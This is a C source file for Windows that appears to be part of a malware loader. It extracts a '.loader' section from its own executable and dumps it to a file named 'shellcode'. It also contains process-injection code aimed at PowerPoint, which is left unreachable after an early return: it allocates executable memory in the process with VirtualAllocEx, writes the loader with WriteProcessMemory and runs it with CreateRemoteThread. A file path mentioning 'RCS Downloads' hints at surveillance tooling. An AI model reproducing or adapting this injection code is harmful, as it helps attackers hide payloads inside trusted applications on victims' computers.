#pragma comment(lib, "Shlwapi")

#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <Shlwapi.h>

#include "main.h"
#include "loader.h"


int __cdecl main()
{
	DWORD dwOut;
	DWORD dwLoaderSize = (DWORD)END_LOADER_DATA - (DWORD)LoaderEntryPoint;

	Startup();
	printf("%08x\n", Startup);
	LPSTR strSelfName = (LPSTR) malloc(0x1000);
	GetModuleFileName(GetModuleHandle(NULL), strSelfName, 0x1000);

	HANDLE hFile = CreateFile(strSelfName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		exit(printf("[!!] CreateFile: %08x\n", GetLastError()));

	DWORD dwFileSize = GetFileSize(hFile, NULL);
	LPBYTE lpBuffer = (LPBYTE) malloc(dwFileSize);
	if (!ReadFile(hFile, lpBuffer, dwFileSize, &dwOut, NULL))
		exit(printf("[!!] ReadFile: %08x\n", GetLastError()));
	CloseHandle(hFile);

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER) lpBuffer;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) (lpBuffer + pDosHdr->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHdr = (PIMAGE_SECTION_HEADER) (pNtHdrs + 1);
	for (UINT i=0; i<pNtHdrs->FileHeader.NumberOfSections; i++)
		if (!__STRCMPI__((LPSTR)pSectionHdr->Name, ".loader"))
			break;
		else
			pSectionHdr++;

	hFile = CreateFile("c:\\users\\guido\\desktop\\RCS Downloads\\shellcode", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		exit(printf("[!!] CreateFile: %08x\n", GetLastError()));
	WriteFile(hFile, lpBuffer + pSectionHdr->PointerToRawData, pSectionHdr->SizeOfRawData, &dwOut, NULL);
	CloseHandle(hFile);

	return 0;
	HANDLE hProcess = GetProcHandle("POWERPNT.exe", PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD);
	if (hProcess == INVALID_HANDLE_VALUE)
		return(printf("[W] No process found\n"));

 	LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, dwLoaderSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpAddress == NULL)
		exit(printf("[!!] VirtualAllocEx: %08x\n", GetLastError()));

	if (!WriteProcessMemory(hProcess, lpAddress, (LPVOID)LoaderEntryPoint, dwLoaderSize, &dwOut))
		exit(printf("[!!] WriteProcessMemory: %08x\n", GetLastError()));

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) ((LPBYTE)lpAddress), NULL, 0, NULL);
	if (hThread == NULL)
		exit(printf("[!!] CreateRemoteThread: %08x\n", GetLastError()));

	WaitForSingleObject(hThread, INFINITE);
	printf("[*] done.\n");
		
	__asm nop;
}



HANDLE GetProcHandle(__in LPSTR strProcName, __in DWORD dwFlags)
{
	HANDLE hSnapshot, hProcess;
	PROCESSENTRY32 pProcEntry;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		exit(printf("[!!] CreateToolhelp32Snapshot: %08x\n", GetLastError()));

	pProcEntry.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &pProcEntry))
		exit(printf("[!!] Process32First: %08x\n", GetLastError()));

	do	
	{
		if (StrStrIA(pProcEntry.szExeFile, strProcName))
		{
			hProcess = OpenProcess(dwFlags, FALSE, pProcEntry.th32ProcessID);
			if (!hProcess)
				exit(printf("[!!] OpenProcess: %08x\n", GetLastError()));
			else
				return hProcess;
		}
	}
	while(Process32Next(hSnapshot, &pProcEntry));

	return INVALID_HANDLE_VALUE;
}